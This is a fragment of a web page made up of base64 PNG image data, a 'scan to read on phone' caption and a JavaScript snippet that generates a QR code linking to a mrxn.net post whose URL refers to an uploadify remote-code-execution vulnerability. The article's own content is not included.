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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/51mis-uploaddify-uploadify-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 